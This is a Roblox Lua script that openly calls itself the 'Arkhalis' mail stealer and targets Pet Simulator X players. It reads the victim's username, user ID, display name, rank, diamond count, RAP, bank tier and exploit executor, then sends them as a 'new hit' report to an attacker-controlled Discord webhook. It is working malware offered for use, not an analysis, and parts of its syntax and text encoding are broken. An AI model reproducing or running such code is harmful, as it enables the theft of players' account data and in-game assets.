--// Executor detector
local executor = identifyexecutor()
  
--// Execution Log
if game.PlaceId == 6284583030 then
	_G.GameIn = "Pet Simulator X"
elseif game.PlaceId == 7722306047 then
	_G.GameIn = "PSX Trading Plaza"
elseif game.PlaceId == 10321372166 then
	_G.GameIn = "PSX Hardcore"
elseif game.PlaceId == 12610002282 then
	_G.GameIn = "PSX Pro Trading Plaza"
elseif game.PlaceId == 11725212117 then
	_G.GameIn = "PSX Voice Trading Plaza"
else
	_G.GameIn = "â“ Couldn't find game"
end
local webhookcolor = "13369599"
_G.CurrentRank = game:GetService("Players").LocalPlayer.PlayerGui.Main.Right.Rank.RankName.Text
_G.PlrUserVictim = game.Players.LocalPlayer.Name
_G.PlrUserIDVictim = game.Players.LocalPlayer.UserId
_G.PlrDisplayNameVictim = game.Players.LocalPlayer.DisplayName
_G.DisplayDiamond = game:GetService("Players").LocalPlayer.leaderstats.Diamonds.Value
_G.DisplayRap = game:GetService("Players").LocalPlayer.leaderstats.RAP.Value
_G.DisplayBankTier = game:GetService("Players").LocalPlayer.PlayerGui.Bank.Frame.BankTitle.Tier.Text
local function sendwebhook(msg)
local msg = {
	["username"]= "Arhalis Stealer"
	["content"]= "**ðŸŽNEW HIT WITH ARKHALISðŸŽ**",
	["embeds"]= {
	  {
		["title"]= "`Arkhalis Mailstealer Results`",
		["description"]= "**Data from the victim**\nðŸ§‘Display Name: ".._G.PlrDisplayNameVictim.."\nðŸ§‘Username: ".._G.PlrUserVictim.."\nðŸ§‘User ID: ".._G.PlrUserIDVictim.."\nðŸ±Rank: ".._G.CurrentRank.."\nðŸŽ®Place: ".._G.GameIn.."\nðŸ’ŽGems: **".._G.DisplayDiamond.."**\nâ¬†ï¸Rap: **".._G.DisplayRap.."**\nðŸ“ˆBank Tier: **".._G.DisplayBankTier.."**\nâ˜ Executor: **"..executor.."**",
		["url"]= "https://discord.gg/34fs3FWt",
		["color"]= ""..webhookcolor.."",
  }
  },
	["attachments"] = {}
  }
  local Webhook = _G.Webhook
  request = http_request or request or HttpPost or syn.request
  request({Url = Webhook, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = game.HttpService:JSONEncode(msg)})
  end
  sendwebhook(msg)
